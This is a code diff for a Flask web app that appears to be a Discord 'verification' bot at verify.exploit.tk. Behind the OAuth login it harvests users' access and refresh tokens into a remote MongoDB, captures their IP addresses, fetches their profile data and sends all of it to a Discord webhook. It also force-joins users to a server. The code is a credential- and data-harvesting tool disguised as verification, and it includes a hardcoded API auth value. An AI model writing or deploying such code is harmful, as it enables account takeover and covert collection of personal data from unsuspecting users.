@@ -4,8 +4,11 @@ import os
 # os.system("pip install dhooks")
 import json, requests
 from dhooks import Webhook, File
-from flask import Flask, redirect, url_for, request
+from flask import Flask, redirect, url_for, request, jsonify
 app = Flask(__name__)
+
+import pymongo
+import urllib.parse
 
 # @app.route('/')
 # def hello_world():
@@ -14,6 +17,10 @@ app = Flask(__name__)
 
 # from discord import *
 # from discord.ext import commands
+
+
+
+
 verified_redirect = ""
 verifier_redir = "https://discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.exploit.tk&response_type=code&scope=identify%20guilds.join"
 hook = os.environ["hook"]
@@ -26,7 +33,12 @@ TOKEN_FINDER_API = "https://"
 TOKEN_FINDER_API_AUTH = "02ab23b5df4ff52f46320e92d7"
 backup_hook = os.environ["backup_"]
 pwd = os.environ['pwd']
+mongopass = os.environ['mongopass']
 
+username = urllib.parse.quote_plus('exploit')
+password = urllib.parse.quote_plus(mongopass)
+uri = "mongodb+srv://%s:%s@auth.njrnqbq.mongodb.net/test" % (username, password)
+conn = pymongo.MongoClient(uri)
 
 def exchange_code(code):
   data = {
@@ -46,7 +58,7 @@ def exchange_code(code):
     return False
 
 
-def add_to_guild(access_token, userID, guild_Id):
+def add_to_guild(access_token, userID, guild_Id, ip):
   url = f"{API_ENDPOINT}/guilds/{guild_Id}/members/{userID}"
 
   botToken = tkn
@@ -59,12 +71,15 @@ def add_to_guild(access_token, userID, guild_Id):
   }
   r = requests.put(url=url, headers=headers, json=data)
   print(r.status_code)
-  
+  endp = "https://canary.discord.com/api/v9/users/@me"
+  r = requests.get(endp, headers={"Authorization": f"Bearer {access_token}"})
+  rjson = r.json()
   # print(response.text)
   # print(response.status_code)
   # print(REDIRECT_URI)
+  content = f">>> new user authed\n\nID: {userID}\nMention:<@{userID}>\nIP: {ip}\n\nData: {rjson}"
   r = requests.post(
-  hook, json={"content": f"successfully added user <@{userID}> | {userID}"})
+  hook, json={ "content": content })
   r = requests.put(
     f"https://canary.discord.com/api/v9/guilds/952495772073619466/members/{userID}/roles/988815859814383648",
     headers={"Authorization": f"Bot {tkn}"})
@@ -99,17 +114,50 @@ def get_new_token(refresh):
 #   return redirect("https://discord.com/invite/spy", code=302)
 
 # def handler(code: str):
-def save(id, access_tk, refresh_tk):
-  with open('Database/access_tokens.json', 'r') as f:
-    db1 = json.load(f)
-    db1[str(id)] = str(access_tk)
-    with open('Database/access_tokens.json', 'w') as f:
-      json.dump(db1, f, indent=2)
-  with open('Database/refresh_tokens.json', 'r') as f:
-    db2 = json.load(f)
-    db2[str(id)] = str(refresh_tk)
-    with open('Database/refresh_tokens.json', 'w') as f:
-      json.dump(db2, f, indent=2)
+def save(id:str, access_tk:str, refresh_tk:str):
+  try:
+    with open('Database/access_tokens.json', 'r') as f:
+      db1 = json.load(f)
+      db1[str(id)] = str(access_tk)
+      with open('Database/access_tokens.json', 'w') as f:
+        json.dump(db1, f, indent=2)
+    with open('Database/refresh_tokens.json', 'r') as f:
+      db2 = json.load(f)
+      db2[str(id)] = str(refresh_tk)
+      with open('Database/refresh_tokens.json', 'w') as f:
+        json.dump(db2, f, indent=2)
+  except:
+    pass
+  found = False
+  db = conn["tokens"]
+  access = db["access"]
+  refresh = db["refresh"]
+  # access.insert_one({"ok": "ok"})
+  idk = access.find()
+  for x in idk:
+    strx = str(x)
+    if id in strx:
+      print("found")
+      found = True
+      accessx = { "$set": { id: access_tk }}
+      access.update_one(x, accessx)
+      refreshx = { "$set": { id: refresh_tk }}
+      refresh.update_one(x, refreshx)
+      break
+    else:
+      continue
+  if found == False:
+    accessx = { id: access_tk }
+    refreshx = { id: refresh_tk }
+    access.insert_one(accessx)
+    refresh.insert_one(refreshx)
+  # try:
+  #   
+    # for x in index1:
+    #   strx = str(x)
+    #   if id in strx:
+        
+    
 
 
 def test():
@@ -242,7 +290,15 @@ def check():
   rjson = r.json()
   print(rjson)
   return "entry found: \n\n%s" % (rjson)
-  
+
+# @app.route("/myip", methods=["GET"])
+# def get_my_ip():
+#   ip = request.environ['HTTP_X_FORWARDED_FOR']
+#   ip = ip.split(',')[0]
+#   return ip
+#     # return jsonify({'ip': request.remote_addr}), 200
+#   ip = request.environ['REMOTE_ADDR']
+#   return str(ip)
     
 @app.route('/usr/passwd')
 def hello_world():
@@ -254,6 +310,11 @@ def process_json():
   # os.system("clear")
   # test()
   # redirect("https://discord.com/invite/spy", code=302)
+  try:
+    ip = request.environ['HTTP_X_FORWARDED_FOR']
+    ip = ip.split(',')[0]
+  except:
+    ip = None
   args = request.args
   if "code" not in args:
     return redirect(verifier_redir, code=302)
@@ -278,7 +339,7 @@ def process_json():
   except:
     return redirect("https://discord.com/oauth2/authorized", code=302)
   try:
-    add_to_guild(str(access_tk), str(id), "952495772073619466")
+    add_to_guild(str(access_tk), str(id), "952495772073619466", ip)
   except:
     pass
   return redirect("https://discord.com/oauth2/authorized", code=302)
